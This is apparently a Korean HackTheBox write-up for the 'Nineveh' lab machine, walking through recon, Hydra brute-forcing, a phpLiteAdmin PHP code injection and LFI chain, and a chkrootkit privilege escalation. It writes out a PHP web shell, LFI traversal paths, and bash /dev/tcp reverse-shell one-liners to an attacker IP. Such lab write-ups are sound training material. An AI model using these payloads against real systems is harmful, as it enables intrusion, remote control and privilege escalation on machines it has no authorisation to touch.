# Nineveh - HackTheBox
## Recon
```bash
sudo nmap -p 80,443 -sC -sV -vv -oA nineveh 10.129.24.66
```
<img width="1204" height="357" alt="image" src="https://github.com/user-attachments/assets/bc031f15-affa-4173-9d5d-1b2dafc2541a" />

- HTTP(80)
- HTTPS(443)

<br>

- `/etc/hosts`에 `nineveh.htb` 추가.
<img width="1204" height="74" alt="image" src="https://github.com/user-attachments/assets/d41d35e7-59bf-45b1-a2d8-2bf34fa947ae" />

---
## HTTPS
### banner grabbing
<img width="1204" height="337" alt="image" src="https://github.com/user-attachments/assets/df3f8f55-a971-4a01-abf8-570c0c43cafe" />

### PHP Code Injection
- `/db` 발견.
```bash
feroxbuster -u https://nineveh.htb -x php,md,txt -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -C 404 --insecure
```
<img width="1204" height="92" alt="image" src="https://github.com/user-attachments/assets/c33cce0b-8fa9-4ac7-9a10-93c113022204" />

<br>
<br>

- `/db` 경로에서 기본 비밀번호로 로그인 시도하였으나 실패.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/b25e51f6-8bfa-4f07-9386-ec8e4b9d4f53" />

<br>
<br>

- 브루트포싱 시도.
```bash
hydra nineveh.htb -l admin -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```
<img width="1204" height="313" alt="image" src="https://github.com/user-attachments/assets/05c7e2c9-4d15-4b0c-a59c-f83c6082e813" />

<br>
<br>

- `password123`으로 로그인 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/44c23b45-885d-4450-8880-732bfa805e67" />

<br>
<br>

- `PHP Code Injection` 취약점 발견.
```bash
searchsploit phpliteadmin
```
<img width="1204" height="248" alt="image" src="https://github.com/user-attachments/assets/4da44808-7e4f-4aa4-b585-7948638a2b44" />

<br>
<br>

- DB를 PHP 확장자로 생성하고 테이블의 기본 값을 PHP 코드를 입력해준 후 해당 db에 접속하는 코드.
```bash
searchsploit -m 24044
```
<img width="1204" height="274" alt="image" src="https://github.com/user-attachments/assets/cb443952-846e-4579-8f63-c1d2bd9f0646" />

<br>
<br>

- `hack.php` DB 생성.
<img width="284" height="99" alt="image" src="https://github.com/user-attachments/assets/eb3f9e60-035b-414d-a119-771c1c319677" />

<br>
<br>

- 테이블 생성.
<img width="573" height="99" alt="image" src="https://github.com/user-attachments/assets/0c47b99d-6888-4e95-8589-7eba84797e8d" />

<br>
<br>

- `<?php phpinfo() ?>` 값 입력.
<img width="789" height="118" alt="image" src="https://github.com/user-attachments/assets/c9fa26da-7100-4a01-9aaa-626e6e671dbb" />

<br>
<br>

- DB가 생성되었지만 DB 경로로 접속할 방법 없음.
<img width="357" height="130" alt="image" src="https://github.com/user-attachments/assets/eced0695-276b-4216-a8b2-e6ae5111153d" />

---
## HTTP
### LFI
- `/department` 경로 발견.
```bash
feroxbuster -u http://10.129.24.66 -x php,md,txt -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -C 404
```
<img width="1203" height="184" alt="image" src="https://github.com/user-attachments/assets/a8123e0b-6a09-4876-bce3-8697dc7c5bc4" />

<br>
<br>

- 기본 계정으로 로그인 시도하였으나 실패.
- `admin`으로 시도할 경우 비밀번호 불일치가 출력되나 다른 계정으로 시도할 경우 유저명 불일치가 출력됨.
<img width="772" height="314" alt="image" src="https://github.com/user-attachments/assets/784ac6a6-1f66-4210-8796-1131569584a9" />
<img width="772" height="314" alt="image" src="https://github.com/user-attachments/assets/b56235b7-2920-41dd-8427-442ff6aded29" />

<br>
<br>

- 브루트포싱 시도.
```bash
hydra 10.129.24.66 -l admin -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:invalid"
```
<img width="1202" height="272" alt="image" src="https://github.com/user-attachments/assets/6a13969c-1540-40a0-b14e-c98e559659f1" />

<br>
<br>

- 로그인 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/024ee22a-14c2-454d-a7f2-5a39151410ab" />

<br>
<br>

- `Notes`탭의 경로에서 파일을 불러오는 것처럼 보임.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/5f2b403f-0c42-4ae6-b08e-9fc57c552a40" />

<br>
<br>

- 기본 경로로 LFI 시도하였으나 실패.
- `.txt`를 지운 상태로 요청 시도하니 에러 메시지 출력.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/9624ba7a-1cd9-4204-aad6-42619f3045f5" />

<br>
<br>

- `files`를 지우고 요청해도 동일한 오류 메시지 출력.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/50b55e95-c7d6-4d8a-8c55-b35119ff6029" />

<br>
<br>

- `/ninevehNotes/../../../../../etc/passwd`경로로 시도하여 LFI 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/2b8bd5c3-dafb-4df9-97b0-351c14e1803c" />

<br>
<br>

- `/ninevehNotes/../../../../../var/tmp/hack.php`로 접속하여 코드 인젝션 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/76dfc020-b721-4579-b221-27cfdb0d4ab2" />

<br>
<br>

- `<?php system($_REQUEST["cmd"]); ?>`로 웹 셸 생성.(작은 따옴표로 시도하여 실패.)
<img width="797" height="120" alt="image" src="https://github.com/user-attachments/assets/c14bcb5f-5e8e-4ca3-bc9b-e064eaac1f65" />

<br>
<br>

- 명령어 실행 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/af2d14de-b9e8-4e05-9364-2b356b07653f" />

<br>
<br>

- 리버스 셸 실행.
```
http://10.129.24.66/department/manage.php?notes=/ninevehNotes/../../../../../var/tmp/hack.php&cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.14.23%2F80%200%3E%261%22
```
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/245716b0-0b92-4c51-9d65-dd2d0a738d0e" />

<br>
<br>

- 셸 획득.
<img width="1203" height="136" alt="image" src="https://github.com/user-attachments/assets/8d6c4fa6-cddc-4b15-8b95-3efa26eb51f4" />

---
## Shell as amrois
- `/var/www/ssl/secure_notes`경로에서 이미지 파일 발견.
<img width="1203" height="136" alt="image" src="https://github.com/user-attachments/assets/7448a688-8000-4d95-b541-3b73eb7b50a9" />

<br>
<br>

- 로컬로 다운로드.
```bash
wget https://nineveh.htb/secure_notes/nineveh.png --no-check-certificate
```
<img width="1203" height="367" alt="image" src="https://github.com/user-attachments/assets/3674b592-1b14-403b-bb6a-26ea3bf5d77e" />

<br>
<br>

- `binwalk`를 사용하여 숨겨진 내용이 있는지 확인.
```bash
binwalk nineveh.png
```
<img width="1203" height="193" alt="image" src="https://github.com/user-attachments/assets/20ce8131-af8e-477e-a94d-a70e214c6d20" />

<br>
<br>

- 숨김 내용 해제.
```bash
binwalk -Me nineveh.png
```
<img width="1203" height="202" alt="image" src="https://github.com/user-attachments/assets/455cccc6-ced2-4652-bc9b-cb6c1e207d7b" />

<br>
<br>

- `/secret`경로에서 비밀키와 공개키 발견.
<img width="1203" height="315" alt="image" src="https://github.com/user-attachments/assets/36b127cf-1cfe-47f0-9039-719b7d4b7db1" />

<br>
<br>

- SSH접속을 시도하려 했으나 `nmap`으로 포트 스캔을 할 때 SSH가 열려 있지 않았음.
- `knockd`가 실행 중.
```bash
ps aux
```
<img width="1203" height="27" alt="image" src="https://github.com/user-attachments/assets/a8789b1d-c8cc-4c03-8d3b-b520d00e5fc2" />

<br>
<br>

- https://wiki.archlinux.org/title/Port_knocking
- `iptables`가 실행 중.
<img width="1203" height="225" alt="image" src="https://github.com/user-attachments/assets/611aba3a-8817-40b4-b53a-384e959bdb14" />

<br>
<br>

- 각각의 포트로 노크를 시도한 후 SSH접속 시도.
```bash
for port in 571 290 911;do sudo nmap -Pn --host-timeout 201 --max-retries 0 -p $port 10.129.24.66;done;ssh -i nineveh.priv amrois@10.129.24.66
```
<img width="1203" height="45" alt="image" src="https://github.com/user-attachments/assets/2603e4d3-ce3d-44e0-8581-1045d4db8b10" />

---
## Privesc
- `pspy64`를 로컬로부터 다운로드 받아서 실행.
- 주기적으로 `chkrootkit`이 실행 됨.
<img width="1203" height="87" alt="image" src="https://github.com/user-attachments/assets/48f0629a-e5ad-4af5-9251-1b52bbc4955d" />

<br>
<br>

- 버전은 확인할 수 없으나 취약점 존재.
```bash
searchsploit chkrootkit
```
<img width="1203" height="176" alt="image" src="https://github.com/user-attachments/assets/961cb858-10d0-4c94-923c-d6095d64215d" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2014-0476
<img width="1012" height="323" alt="image" src="https://github.com/user-attachments/assets/6735470b-d752-4b7d-a95d-3908c1384c27" />

<br>
<br>

- https://www.exploit-db.com/exploits/38775
- `/tmp`에 리버스 셸 코드 `update`를 생성.
```bash
echo '#!/bin/bash' > update

echo 'bash -c "bash -i >&/dev/tcp/10.10.14.23/80 0>&1"' >> update

chmod +x update
```
<img width="1206" height="69" alt="image" src="https://github.com/user-attachments/assets/efb2b850-79ae-4c8e-8f83-c8a8e28d9a8b" />

<br>
<br>

- 셸 획득.
<img width="1206" height="202" alt="image" src="https://github.com/user-attachments/assets/4e57a1e2-6f02-4b35-a443-4056791a2b05" />

---
## FLAG
- `/home/amrois/user.txt`
<img width="1206" height="264" alt="image" src="https://github.com/user-attachments/assets/98443b26-dc1b-415b-8629-87584b17d3a5" />

<br>
<br>

- `/root/root.txt`
<img width="1206" height="309" alt="image" src="https://github.com/user-attachments/assets/b5da07c7-eeae-49bf-bb83-51f13eccbafb" />
